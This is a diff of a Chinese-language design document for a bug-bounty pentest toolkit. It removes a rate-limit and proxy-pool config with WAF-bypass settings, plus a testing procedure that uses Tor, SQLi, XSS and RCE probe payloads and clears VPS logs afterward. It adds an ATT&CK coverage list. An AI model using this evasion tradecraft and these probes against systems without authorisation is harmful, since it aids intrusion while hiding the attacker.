+| Turla | 水坑攻击 | Snake, Carbon | 政府/外交 |
 
-```yaml
-# 推荐的安全限速配置（SRC 用）
-rate_limit:
-  requests_per_second: 2       # 保守限速
-  max_concurrent: 2            # 最多 2 并发
-  delay_between_phases: 10     # 阶段间等 10 秒
-  max_total_requests: 300      # 单次最多 300 请求
-
-# 红线检测（自动停止）
-redline:
-  check_interval: 5            # 每 5 请求检查一次
-  max_404_ratio: 0.7           # 404 超过 70% 停止（可能是 WAF）
-  max_403_consecutive: 3       # 连续 3 次 403 停止
-  forbidden_keywords:
-    - "IP已被封禁"
-    - "请完成人机验证"
-    - "频率过快"
-    - "Too Many Requests"
-    - "Access Denied"
-    - "Blocked"
-
-# WAF 自适应
-deep_hunt:
-  enable_waf_bypass: true
-  waf_type: "auto"             # 自动识别 WAF 类型
-
-# 代理配置
-waf_evasion:
-  proxy_pool:
-    - "socks5://proxy1:1080"
-    - "socks5://proxy2:1080"
-    - "socks5://proxy3:1080"
-```
-
-### 19.12 完整操作 SOP（标准操作流程）
+### 22.7 Bai-codeagent ATT&CK 覆盖度
 
 ```
-┌──────────────────────────────────────────────────────────────┐
-│  SRC 安全操作标准流程                                         │
-├──────────────────────────────────────────────────────────────┤
-│                                                              │
-│  1. 准备阶段                                                 │
-│     □ 开新 VPS（按小时付费）                                  │
-│     □ 配置 SSH 密钥登录 + 改端口                              │
-│     □ 安装 proxychains + Tor                                 │
-│     □ 配置代理池（至少 3 个 SOCKS5）                          │
-│     □ 测试代理是否工作: curl ifconfig.me                      │
-│                                                              │
-│  2. 侦察阶段（被动优先）                                      │
-│     □ 被动子域名收集（subfinder -silent）                     │
-│     □ Wayback / gau 收集历史 URL                             │
-│     □ Google Dork 搜索（不直接访问目标）                       │
-│     □ FOFA/Shodan 查端口和指纹                               │
-│     → 此阶段不直接访问目标，零日志                             │
-│                                                              │
-│  3. 主动扫描（通过代理 + 限速）                               │
-│     □ 检查目标是否正常（curl 测试）                            │
-│     □ httpx 存活探测（-rl 2）                                │
-│     □ nuclei 漏洞扫描（-rl 3 通过代理）                       │
-│     □ 参数发现（arjun --stable）                             │
-│     → 全程走代理，限速 2-3 req/s                              │
-│                                                              │
-│  4. 漏洞验证（精准 + 最小化）                                 │
-│     □ 只验证存在性，不扩大利用                                │
-│     □ SQLi: AND 1=1 vs AND 1=2                              │
-│     □ XSS: alert(document.domain) 截图即止                   │
-│     □ IDOR: 看 1 条别人的数据即止                             │
-│     □ RCE: whoami 截图即止                                   │
-│     → 手动操作，不用自动化工具深入                             │
-│                                                              │
-│  5. 收尾阶段                                                 │
-│     □ 整理漏洞报告 + 截图                                     │
-│     □ 提交 SRC 平台                                          │
-│     □ 清理 VPS 日志                                          │
-│     □ 销毁临时 VPS                                           │
-│     □ 本地证据加密保存                                        │
-│                                                              │
-└──────────────────────────────────────────────────────────────┘
+当前项目工具链覆盖的 ATT&CK 技术：
+
+✅ 已覆盖（通过现有模块）：
+  - TA0043 侦察：subfinder, httpx, nuclei, FOFA
+  - TA0001 初始访问：Web漏洞利用（SQLi/XSS/SSRF）
+  - TA0002 执行：命令注入测试
+  - TA0006 凭据获取：token-scan, secrets-hunt
+  - TA0007 发现：recon, surface, asset_discovery
+
+⚠️ 部分覆盖（需扩展）：
+  - TA0005 防御绕过：WAF 绕过（bypass-403）
+  - TA0011 C2：无（工具本身不做C2）
+
+❌ 未覆盖（可作为扩展方向）：
+  - TA0004 提权：内网提权模块
+  - TA0008 横向移动：内网横向工具
+  - TA0003 持久化：后渗透持久化
+  - TA0010 数据窃取：安全数据外传
 ```
 
 ---
